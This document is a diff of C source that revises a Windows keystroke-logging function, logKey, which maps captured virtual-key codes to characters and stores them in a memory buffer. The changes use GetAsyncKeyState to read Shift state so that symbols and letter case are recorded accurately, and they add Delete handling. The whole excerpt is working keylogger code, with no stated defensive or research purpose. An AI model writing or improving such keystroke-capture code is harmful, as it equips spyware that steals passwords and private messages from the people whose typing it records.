@@ -21,24 +21,49 @@ typedef struct {
     size_t used;
 } MemoryRegion;
 
+
 int logKey(int _key, MemoryRegion* memRegion) {
     char output[2]; // Buffer to store a single character
     output[1] = '\0'; // Null-terminate the string
 
-    // Map the virtual key to its character representation
     if ((_key >= 0x30 && _key <= 0x39) || // Numbers
         (_key >= 0x41 && _key <= 0x5A)) { // Letters
-        output[0] = (char)_key; // Map directly
-    }
-    else {
-        // Handle special keys (you can add more mappings if needed)
+        // Check if Shift key is pressed
+        bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+
+        if (_key >= 0x30 && _key <= 0x39) { // Numbers
+            if (isShiftPressed) {
+                // Map numbers to their shifted counterparts
+                const char shiftedNumbers[] = ")!@#$%^&*(";
+                output[0] = shiftedNumbers[_key - 0x30];
+            } else {
+                output[0] = (char)_key;
+            }
+        } else { // Letters
+            output[0] = isShiftPressed ? (char)_key : (char)(_key + 32); // Adjust for lowercase if no Shift
+        }
+    } else {
+        // Handle special keys
         switch (_key) {
-        case VK_SPACE: output[0] = ' '; break;
-        case VK_RETURN: output[0] = '\n'; break;
-        case VK_TAB: output[0] = '\t'; break;
-        default: return 0; // Ignore unmapped keys
+            case VK_SPACE:
+                output[0] = ' ';
+                break;
+            case VK_RETURN:
+                output[0] = '\n';
+                break;
+            case VK_TAB:
+                output[0] = '\t';
+                break;
+            case VK_DELETE:
+                output[0] = '\b'; // Use backspace representation for simplicity
+                break;
+            default:
+                return 0; // Ignore unmapped keys
         }
     }
+
+    // Null-terminate the string
+    output[1] = '\0';
 
     size_t outputLen = strlen(output);
 
